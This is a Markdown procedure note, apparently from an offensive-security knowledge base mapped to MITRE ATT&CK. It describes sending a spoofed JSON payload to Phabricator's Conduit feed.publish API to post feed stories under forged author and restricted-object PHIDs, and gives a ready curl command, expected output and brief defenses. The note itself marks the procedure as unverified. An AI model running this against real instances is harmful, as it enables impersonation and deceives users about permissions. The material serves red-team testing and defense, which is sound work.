---
id: proc-uuid-4
tags:
  - phabricator
  - api-submission
  - auth-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-submit-phabricator-feed]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:11.074Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Submit Spoofed Payload to Phabricator Feed API

## Summary

Send the manipulated JSON payload to the feed.publish endpoint to publish a spoofed story, bypassing validation for impersonation or false access display.

## Description

Using Conduit's JSON-RPC format, POST the payload to /api/feed.publish with authentication token. The API lacks PHID checks, allowing stories to appear as if from spoofed authors or involving restricted objects. This can mislead users about actions/permissions. Requires valid session; outcomes include visible feed entries requiring admin cleanup.

## Requirements

1. Valid Conduit API token
2. Prepared spoofed JSON payload
3. HTTPS access to Phabricator instance

## Defense

Defensive measures and detection strategies:

- Enforce PHID authorization in feed engine
- Rate-limit feed.publish calls per user
- Review and auto-delete anomalous stories via audits

## Objectives

1. Publish spoofed feed story successfully
2. Verify appearance in news feed
3. Demonstrate bypass of access controls

## Instructions

### Step 1: Prepare API Request

**Context**: Encode payload for form submission.

**Instructions**: URL-encode the 'data' JSON if needed.

### Step 2: Execute Submission

**Context**: POST to endpoint with spoofed data.

**Command** ([[commands/curl-submit-phabricator-feed]]):
```bash
curl -X POST 'https://phabricator.example.com/api/feed.publish' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'output=json&__conduit__={"token":"api-token-here"}&type=PhabricatorTokenGivenFeedStory&data={"authorPHID":"PHID-USER-spoofed","tokenPHID":"PHID-TOKN-medal-4","objectPHID":"PHID-PROJ-restricted"}'
```

> Expected output: {"result":{"story":{"id":"123",...}}} indicating success. Check feed for story visibility.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-submit-phabricator-feed]]

## Tools Used


## Tags

- phabricator
- api-submission
- auth-bypass
